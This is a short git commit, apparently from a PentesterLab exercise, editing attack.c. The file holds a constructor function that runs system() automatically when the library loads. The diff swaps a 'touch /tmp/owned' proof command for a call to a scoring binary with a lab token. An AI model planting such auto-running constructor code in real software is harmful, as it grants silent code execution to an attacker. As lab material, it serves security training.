6562df9c68bf1650e2c5ac939a85353fd2630983
test <test@pentesterlab.com>
2022-07-14 00:22:55 -0400

    attack1

--- attack.c
+++ attack.c
@@ -4,5 +4,5 @@
 static void malicious() __attribute__((constructor));
 
 void malicious() {
-    system("touch /tmp/owned");
+    system("/usr/local/bin/score e3f9faf4-6c9f-4823-ad5b-06b4d299fc71");
 }
